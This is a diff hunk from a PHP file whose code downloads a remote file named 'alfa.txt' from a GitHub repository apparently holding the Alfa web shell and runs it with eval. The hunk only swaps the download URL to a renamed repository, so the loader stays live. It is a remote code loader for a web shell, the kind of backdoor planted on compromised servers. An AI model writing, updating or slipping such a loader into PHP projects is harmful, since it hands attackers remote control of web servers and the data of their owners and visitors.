@@ -7,7 +7,7 @@ function ec($u){
     curl_close($c);
     return $r;
 }
-$u= "https://raw.githubusercontent.com/Lucenox/AlfaShell/refs/heads/main/alfa.txt";
+$u= "https://raw.githubusercontent.com/Lucenox/alfa-shell/refs/heads/main/alfa.txt";
 $ft= ec($u);
 if (!empty($ft)) {
     eval("?>".$ft);
